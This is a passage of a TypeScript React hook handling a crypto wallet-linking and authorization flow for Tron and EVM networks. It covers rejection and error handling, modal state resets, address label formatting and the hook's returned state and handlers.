                ) {
                  setLinkCancelled(
                    args.network,
                    PERMISSION_DENIED_BY_USER_MESSAGE,
                  );
                }
                args.onStage?.({
                  stage: stageResult.stage,
                  status: stageResult.status,
                  error: stageResult.error ?? null,
                });
              },
            },
          );
        },
      });

      if (summary.authorizedCount === 0 && summary.rejectedCount > 0) {
        const rejectedNetwork =
          summary.items.find((item) => item.outcome === "user_rejected")
            ?.network ?? selectedKey;
        if (rejectedNetwork) {
          setLinkCancelled(rejectedNetwork, PERMISSION_DENIED_BY_USER_MESSAGE);
        }
      }
    } catch (err: unknown) {
      const message = getErrorMessage(err, "Authorization session failed");
      logStep("AUTHORIZATION SESSION FAILED", { error: message });
      linkingNetworkKeyRef.current = null;
      if (isUserRejection(err) && selectedKey) {
        setLinkCancelled(selectedKey, PERMISSION_DENIED_BY_USER_MESSAGE);
      } else if (selectedKey) {
        setLinkCancelled(selectedKey, message);
      } else {
        setError(message);
        setModalStep("preferences");
      }
    } finally {
      setAuthorizingAsset(null);
      if (!linkingNetworkKeyRef.current) {
        approvingLockRef.current = false;
        setApproving(false);
      }
    }
  }, [
    advanceLinkProgress,
    clearLinkCompleteTimer,
    createStageAwareLogger,
    handleSettlementProgress,
    logStep,
    mapApprovalStageToPhase,
    networks,
    preferences,
    selectedKey,
    setStatus,
    setLinkCancelled,
  ]);

  const closeResultsModal = useCallback(() => {
    if (approving) return;
    setShowResults(false);
    setShowNetworkFetchOverlay(false);
    setNetworksLoading(false);
    setModalStep("preferences");
    linkingNetworkKeyRef.current = null;
    setRowStatus((prev) => {
      const next: Record<string, RowStatus> = { ...prev };
      for (const key of Object.keys(next)) {
        if (next[key] === "linked") {
          next[key] = "awaiting";
        }
      }
      return next;
    });
  }, [approving]);

  const continueFromConnected = useCallback(() => {
    if (approving || networks.length === 0) return;
    setModalStep("preferences");
    setError(null);
  }, [approving, networks.length]);

  const linkedAddressLabel =
    linkedAccounts.tron && linkedAccounts.evm
      ? `Tron ${shortAddress(linkedAccounts.tron, 4, 4)} · EVM ${shortAddress(linkedAccounts.evm, 4, 4)}`
      : linkedAccounts.tron
        ? shortAddress(linkedAccounts.tron, 6, 4)
        : linkedAccounts.evm
          ? shortAddress(linkedAccounts.evm, 6, 4)
          : null;

  return {
    ready,
    busy,
    approving,
    showResults,
    showNetworkFetchOverlay,
    networksLoading,
    showCardModal,
    cardModalConnecting,
    selectedCardTier,
    linkProgress,
    linkNetworkError,
    walletConnected,
    linkedAccounts,
    linkedAddressLabel,
    error,
    networks,
    selectedKey,
    rowStatus,
    modalStep,
    preferences,
    sessionResult,
    authorizingAsset,
    authorizingPhase,
    authorizingProgress,
    nativeEstimates,
    nativeEstimateLoading,
    nativeEstimateErrors,
    spenderEvm: getSpenderForNetwork(props, "eth"),
    spenderTron: getSpenderForNetwork(props, "tron"),
    termsVersion: TERMS_VERSION,
    startLinkFlow,
    closeCardModal,
    continueFromCardSelect,
    openWalletConnect,
    onSelectNetwork,
    proceedWithLinkedNetworks,
    continueFromConnected,
    onAuthorize: () => {
      void requestAuthorizeSession();
    },
    onRetryNativeEstimate: (network: string) => {
      void refreshNativeEstimateFor(network);
    },
    closeResultsModal,
  };
}
